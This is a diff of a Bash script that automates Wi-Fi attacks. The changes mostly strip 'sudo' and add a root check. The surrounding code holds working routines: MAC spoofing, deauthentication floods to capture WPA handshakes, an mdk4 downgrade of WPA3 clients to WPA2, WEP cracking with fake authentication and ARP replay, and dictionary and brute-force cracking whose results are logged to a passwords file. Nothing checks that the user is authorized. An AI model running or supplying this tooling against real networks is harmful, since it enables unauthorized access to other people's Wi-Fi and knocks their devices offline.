@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# version: 3.5.4 23/5/25 14:10
+# version: 3.5.5 26/5/25 11:55
 
 
 ### Changlog ###
@@ -33,7 +33,7 @@
 
 # **IMPORTANT** for Alfa AWUS036AXML wifi card:
 # 	Don't run apt upgrade. or else the card won't work (I couldn't solve it with the Linux drivers that Alfa offered).
-# 	To enable 6Ghz run: "sudo iw reg set US" and reboot. to check if its enabled run: "iw list".
+# 	To enable 6Ghz run: "iw reg set US" and reboot. to check if its enabled run: "iw list".
 
 
 # **IMPORTANT** if we use GPU with Hashcat:
@@ -63,6 +63,13 @@ oui_file="$targets_path/oui.txt"
 oui_vendor=""
 
 
+# Check if the script is run as root
+if [ "$EUID" -ne 0 ]; then
+  echo "Please run this script as root or with sudo."
+  exit 1
+fi
+
+
 # Ensure required directories exist
 mkdir -p "$targets_path"
 if [ -d "$targets_path/Scan" ]; then
@@ -70,7 +77,7 @@ if [ -d "$targets_path/Scan" ]; then
 fi
 mkdir "$targets_path/Scan"
 touch "$targets_path/wifi_passwords.txt"	    
-sudo chown -R $UN:$UN $targets_path
+chown -R $UN:$UN $targets_path
 
 
 
@@ -83,9 +90,9 @@ function install_dependencies() {
     for package in "${packages[@]}"; do
         if ! dpkg -l | grep -q "^ii  $package "; then
             echo -e "\nUpdating the repositories.."
-            sudo apt update
+            apt update
             echo "$package is not installed. Installing..."
-            sudo apt install -y $package
+            apt install -y $package
         fi
     done
 }
@@ -97,7 +104,7 @@ function install_dependencies() {
 function check_wordlist() {
     # Check if /usr/share/wordlist directory exists, if not, create it
     if [ ! -d "$wordlists_dir" ]; then
-        sudo mkdir -p "$wordlists_dir"
+        mkdir -p "$wordlists_dir"
         echo "wordlist folder created"
     fi
     # Check if rockyou.txt exists, if yes, continue code
@@ -107,10 +114,10 @@ function check_wordlist() {
         # Check if rockyou.gz exists, if yes, unzip it
         if [ -f "$rockyou_gz" ]; then
             echo -e "\n\nrockyou.gz found. Unzipping..."
-            sudo gzip -d "$rockyou_gz"
+            gzip -d "$rockyou_gz"
         else
             echo -e "\n\nDownloading the rockyou wordlist file.\n"
-            sudo wget -q -P $wordlists_dir https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
+            wget -q -P $wordlists_dir https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
             wait
         fi
     fi
@@ -130,7 +137,7 @@ function check_wordlist() {
 # Adapter Configuration
 # ------------------------------
 function adapter_config() {
-	sudo airmon-ng check kill > /dev/null 2>&1   # Kill interfering processes
+	airmon-ng check kill > /dev/null 2>&1   # Kill interfering processes
 
 	# Check known adapters first
 	if iwconfig wlan1 &> /dev/null; then
@@ -156,7 +163,7 @@ function adapter_config() {
 	    fi
 	fi  	
 	echo -e "\e[1mWiFi adapter:\e[0m $wifi_adapter\nChanging $wifi_adapter to monitor mode"
-	sudo airmon-ng start "$wifi_adapter" > /dev/null 2>&1
+	airmon-ng start "$wifi_adapter" > /dev/null 2>&1
 
 	# Find the new monitor mode adapter name
 	mon_adapter=$(iw dev | awk '/Interface/ && /mon$/ {print $2}')
@@ -177,10 +184,10 @@ function spoof_adapter_mac() {
 	# Spoof Adapter mac address to random address
 	echo -e "\nRandomizing our wifi adapter mac address:"
 	
-	sudo ifconfig ${wifi_adapter}mon down
-        sudo macchanger -r ${wifi_adapter}mon > /dev/null 2>&1
-        sudo ifconfig ${wifi_adapter}mon up
-        sudo macchanger -s ${wifi_adapter}mon
+	ifconfig ${wifi_adapter}mon down
+        macchanger -r ${wifi_adapter}mon > /dev/null 2>&1
+        ifconfig ${wifi_adapter}mon up
+        macchanger -s ${wifi_adapter}mon
 	random_mac=$(ip link show ${wifi_adapter}mon | awk '/link\/ieee802.11/ {print $2}') 
 }
 
@@ -190,7 +197,7 @@ function spoof_adapter_mac() {
 function network_scanner() {	
         # Scan 15 seconds for wifi networks   
         countdown_duration=15
-        sudo gnome-terminal --geometry=110x35-10000-10000 -- bash -c "sudo timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
+        gnome-terminal --geometry=110x35-10000-10000 -- bash -c "timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
 
         echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
         for (( i=$countdown_duration; i>=1; i-- )); do
@@ -388,8 +395,8 @@ function choose_network() {
         fi
 
         # Check if we already have the Wi-Fi password for this BSSID
-        if sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The Wi-Fi password is:"; then
-            wifi_password=$(sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The Wi-Fi password is:" | awk -F': ' '{print $2}' | xargs)
+        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The Wi-Fi password is:"; then
+            wifi_password=$(grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The Wi-Fi password is:" | awk -F': ' '{print $2}' | xargs)
             echo -e "\033[1;32mPassword already exists for this network!\033[0m"
             echo -e "\033[1;34mThe Wi-Fi password is:\033[0m \033[1;33m$wifi_password\033[0m\n"
             echo -e "Choose different Network.\n"
@@ -405,10 +412,10 @@ function choose_network() {
 
         # If we only captured the handshake from previous scan
         if [ -d "$targets_path/$bssid_name" ]; then
-            if sudo grep -q "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt"; then
+            if grep -q "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt"; then
                 echo -e "\033[1;32mHandshake found from previous scan.\033[0m\n"
-                sudo pkill aireplay-ng
-                sudo pkill airodump-ng
+                pkill aireplay-ng
+                pkill airodump-ng
                 cleanup
                 choose_attack
                 exit 1   
@@ -433,7 +440,7 @@ function validate_network() {
     echo -e "\e[1mValidating network:\e[0m"
     
     # Open airodump-ng in a hidden terminal
-    gnome-terminal --geometry=105x15-10000-10000 -- script -c "sudo airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
+    gnome-terminal --geometry=105x15-10000-10000 -- script -c "airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
 
     found=0
     echo -n "Checking"
@@ -451,8 +458,8 @@ function validate_network() {
     echo ""  # New line after dots
 
     if [ $found -eq 0 ]; then
-        sudo pkill aireplay-ng
-        sudo pkill airodump-ng
+        pkill aireplay-ng
+        pkill airodump-ng
         echo -e "\e[1;31mNetwork appears to be offline now.\e[0m"
         another_scan_prompt
     fi
@@ -488,7 +495,7 @@ function devices_scanner() {
     duration=60  # Set countdown time (seconds)
     
     while [ $duration -gt 0 ]; do
-        target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")
+        target_devices=$(grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")
 
         if [ -n "$target_devices" ]; then
             # Print Devices_Found with vendor names
@@ -513,10 +520,10 @@ function devices_scanner() {
         printf "\r\e[1;34m%02d:%02d\e[0m Scanning for devices.." "$minutes" "$seconds"
 
         # Check if handshake is found
-        if sudo grep -q "EAPOL" "$targets_path/$bssid_name/airodump_output.txt"; then
+        if grep -q "EAPOL" "$targets_path/$bssid_name/airodump_output.txt"; then
             echo -e "\033[1;32m\n->> Got the EAPOL handshake!\033[0m\n"
-            sudo pkill aireplay-ng
-            sudo pkill airodump-ng
+            pkill aireplay-ng
+            pkill airodump-ng
             echo
             echo --- >> "$targets_path/wifi_passwords.txt"
             printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
@@ -533,7 +540,7 @@ function devices_scanner() {
 
     if [ -z "$target_devices" ]; then
         echo -e "\033[1;31m\033[1mNo device were found.\033[0m\n\n"
-        sudo pkill airodump-ng
+        pkill airodump-ng
         rm -r "$targets_path/$bssid_name"
         another_scan_prompt
     fi
@@ -547,7 +554,7 @@ function devices_scanner() {
 # ------------------------------
 function mixed_encryption() {
     echo -e "\033[1mThe Encryption is "$encryption". \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\033[0m\n"
-    gnome-terminal --geometry=70x3-10000-10000 -- sudo timeout 95s mdk4 $wifi_adapter"mon" b -n $bssid_name_original -c $channel -w a
+    gnome-terminal --geometry=70x3-10000-10000 -- timeout 95s mdk4 $wifi_adapter"mon" b -n $bssid_name_original -c $channel -w a
     sleep 5
 }
 
@@ -561,9 +568,9 @@ function deauth_attack() {
 	    # trying 10 times (1.5 minutes) the deauth attack
 	    counter=10
 	    for ((i=1; i<=$counter; i++)); do        
-		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		
+		target_devices=$(grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		
 
-		gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"mon
+		gnome-terminal --geometry=78x4-10000-10000 -- timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"mon
 		
 		echo -e "Attempt \e[1;34m$i/$counter\e[0m to capture handshake of:"         			
 		# Print MAC addresses with vendor names
@@ -583,10 +590,10 @@ function deauth_attack() {
 		# waiting 9 sec after deauth attack while looking for handshake:
 		for ((j=1; j<=9; j++)); do
 		    sleep 1
-		    if sudo grep -q "EAPOL" "$targets_path/$bssid_name/airodump_output.txt"; then
+		    if grep -q "EAPOL" "$targets_path/$bssid_name/airodump_output.txt"; then
 		        echo -e "\033[1;32m->> Got the EAPOL handshake!\033[0m\n"
-		        sudo pkill aireplay-ng
-			sudo pkill airodump-ng
+		        pkill aireplay-ng
+			pkill airodump-ng
 			echo
 			echo --- >> $targets_path/wifi_passwords.txt
 			printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
@@ -596,8 +603,8 @@ function deauth_attack() {
 	    # after 10 unseccessfull attempts, quit the script:
 	    if [ "$i" == "$counter" ]; then
 	    	echo -e "\n\033[1;31m\033[1mNo handshake obtained.\033[0m \033[1mTry again.\033[0m"
-	    	sudo pkill aireplay-ng
-		sudo pkill airodump-ng
+	    	pkill aireplay-ng
+		pkill airodump-ng
 		rm -r $targets_path/"$bssid_name"
 		another_scan_prompt
 	    fi
@@ -628,7 +635,7 @@ function crack_wep() {
     # Start airodump-ng in a new terminal and get the terminal's PID
     # The 'exec bash' at the end of commands run in gnome-terminal keeps the terminal open after the command finishes, useful for inspection.
     # Remove 'exec bash' if you want the terminal to close automatically.
-    gnome-terminal --geometry=92x17-10000-10000 -- bash -c "sudo airodump-ng --bssid $bssid_address --channel $channel --write \"$targets_path/$bssid_name/$bssid_name\" ${wifi_adapter}mon; exec bash" &
+    gnome-terminal --geometry=92x17-10000-10000 -- bash -c "airodump-ng --bssid $bssid_address --channel $channel --write \"$targets_path/$bssid_name/$bssid_name\" ${wifi_adapter}mon; exec bash" &
     airodump_terminal_pid=$!
 
     #echo -e "[*] Waiting 6 seconds for airodump-ng to initialize and create capture files..."
@@ -637,22 +644,22 @@ function crack_wep() {
     # Check if capture file was created
     if [ ! -f "$targets_path/$bssid_name/$bssid_name-01.cap" ]; then
         echo -e "\033[1;31mError: Capture file ($targets_path/$bssid_name/$bssid_name-01.cap) not created. Airodump-ng might have failed. Aborting WEP crack.\033[0m"
-        if [ -n "$airodump_terminal_pid" ]; then sudo kill "$airodump_terminal_pid" 2>/dev/null; fi
+        if [ -n "$airodump_terminal_pid" ]; then kill "$airodump_terminal_pid" 2>/dev/null; fi
         return 1
     fi
     
     echo -e "[*] Attempting deauthentication attack to generate IVs..."
-    gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 10s aireplay-ng --deauth 10 -a "$bssid_address" "${wifi_adapter}mon"
+    gnome-terminal --geometry=78x4-10000-10000 -- timeout 10s aireplay-ng --deauth 10 -a "$bssid_address" "${wifi_adapter}mon"
     # No need to wait for deauth terminal, it's short-lived
 
     echo -e "[*] Attempting fake authentication with AP ($bssid_address)..."
-    gnome-terminal --geometry=78x5-10000-10000 -- bash -c "sudo aireplay-ng -1 0 -a $bssid_address -h $random_mac ${wifi_adapter}mon; echo 'Fake auth attempt finished. Press Enter to close.'; read"
+    gnome-terminal --geometry=78x5-10000-10000 -- bash -c "aireplay-ng -1 0 -a $bssid_address -h $random_mac ${wifi_adapter}mon; echo 'Fake auth attempt finished. Press Enter to close.'; read"
     #echo -e "[*] Pausing for 3 seconds after fake authentication attempt..."
     sleep 3 # Give time for fake auth to potentially associate
 
     echo -e "[*] Attempting ARP Replay attack to generate IVs faster..."
     # Start ARP Replay in a new terminal and get its PID
-    gnome-terminal --geometry=78x6-10000+10000 -- bash -c "sudo aireplay-ng -3 -b $bssid_address -h $random_mac ${wifi_adapter}mon; echo 'ARP Replay attack finished or stopped. Press Enter to close.'; read" &
+    gnome-terminal --geometry=78x6-10000+10000 -- bash -c "aireplay-ng -3 -b $bssid_address -h $random_mac ${wifi_adapter}mon; echo 'ARP Replay attack finished or stopped. Press Enter to close.'; read" &
     arp_replay_terminal_pid=$!
     sleep 2 # Give ARP replay a moment to start
 
@@ -673,7 +680,7 @@ function crack_wep() {
         #echo -e "[*] Running aircrack-ng (10s timeout)..."
         # Use --wait for this terminal as we want the script to wait for aircrack-ng's attempt
         # CRITICAL FIX: Changed 'tee' to 'tee -a' to append to the output file
-        gnome-terminal --wait --geometry=84x23-10000+10000 -- bash -c "sudo timeout 10s aircrack-ng -b $bssid_address \"$targets_path/$bssid_name/$bssid_name-01.cap\" | tee -a \"$output_file\"; echo 'Aircrack-ng attempt finished. This window will close in 5s.'; sleep 5"
+        gnome-terminal --wait --geometry=84x23-10000+10000 -- bash -c "timeout 10s aircrack-ng -b $bssid_address \"$targets_path/$bssid_name/$bssid_name-01.cap\" | tee -a \"$output_file\"; echo 'Aircrack-ng attempt finished. This window will close in 5s.'; sleep 5"
         
         # Check if aircrack-ng found the key in its latest output
         if grep -q "KEY FOUND!" "$output_file"; then
@@ -693,15 +700,15 @@ function crack_wep() {
     # Kill the airodump-ng and ARP replay terminals
     if [ -n "$airodump_terminal_pid" ] && kill -0 "$airodump_terminal_pid" 2>/dev/null; then
         echo "[*] Closing airodump-ng terminal..."
-        sudo kill "$airodump_terminal_pid" 2>/dev/null
+        kill "$airodump_terminal_pid" 2>/dev/null
     fi
     if [ -n "$arp_replay_terminal_pid" ] && kill -0 "$arp_replay_terminal_pid" 2>/dev/null; then
         echo "[*] Closing ARP replay terminal..."
-        sudo kill "$arp_replay_terminal_pid" 2>/dev/null
+        kill "$arp_replay_terminal_pid" 2>/dev/null
     fi
     # General cleanup for any stray aireplay processes
-    sudo pkill aireplay-ng > /dev/null 2>&1
-    sudo pkill airodump-ng > /dev/null 2>&1
+    pkill aireplay-ng > /dev/null 2>&1
+    pkill airodump-ng > /dev/null 2>&1
 
 
     if grep -q "KEY FOUND!" "$output_file"; then
@@ -777,7 +784,13 @@ echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
         wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
         echo -e "\033[1;34mThe Wi-Fi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m\t\033[1;33m$wifi_pass\033[0m"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with selected wordlist// } }" "$targets_path/wifi_passwords.txt"
+        
+        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with selected wordlist// } }" "$targets_path/wifi_passwords.txt"
+        
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"
+
+        
+        
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
         rm -r "$targets_path/$bssid_name"
         exit 1
@@ -788,10 +801,10 @@ echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with selected wordlist" "$targets_path/wifi_passwords.txt"
         
         echo
-        read -p "Do you want to run a Brute-Force attack? (Y/n): " choice
+        read -p "Do you want to try different attack? (Y/n): " choice
         case $choice in
             y|Y)
-                brute-force_attack
+                choose_attack
                 ;;
             n|N)
                 another_scan_prompt
@@ -948,7 +961,11 @@ function brute-force_attack() {
         wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
         echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with selected wordlist// } }" "$targets_path/wifi_passwords.txt"
+        
+        
+        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with selected wordlist// } }" "$targets_path/wifi_passwords.txt"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"
+        
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
         rm -r $targets_path/"$bssid_name" 
         exit 1
@@ -956,10 +973,10 @@ function brute-force_attack() {
         echo -e "\n\033[1;31m\033[1mCouldn't cracked with Brute-Force with this masking: $full_mask\033[0m\n"
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Brute-Force of this masking: $full_mask" "$targets_path/wifi_passwords.txt"
         echo
-        read -p "Do you want to run a dictionary attack (Y/n)? " choice
+        read -p "Do you want to try different attack (Y/n)? " choice
         case $choice in
             y|Y)
-                dictionary_attack
+                choose_attack
                 ;;
             n|N)
                 another_scan_prompt
@@ -1010,7 +1027,7 @@ function enable_gpu() {
 	    for package in "${packages[@]}"; do
 		    if ! dpkg -l | grep -q "^ii  $package "; then
 		        echo -e "\nInstalling $package..."
-		        sudo apt install -y "$package"
+		        apt install -y "$package"
 		    else
 		        echo -e "✅ $package is already installed."
 		    fi
@@ -1092,9 +1109,9 @@ function another_scan_prompt() {
 # Cleanup
 # ------------------------------
 function cleanup() {
-	sudo chown -R $UN:$UN $targets_path
-	gnome-terminal --geometry=1x1-10000-10000 -- sudo airmon-ng stop "$wifi_adapter"mon
-	gnome-terminal --geometry=1x1-10000-10000 -- sudo systemctl start NetworkManager
+	chown -R $UN:$UN $targets_path
+	gnome-terminal --geometry=1x1-10000-10000 -- airmon-ng stop "$wifi_adapter"mon
+	gnome-terminal --geometry=1x1-10000-10000 -- systemctl start NetworkManager
 }
 
 
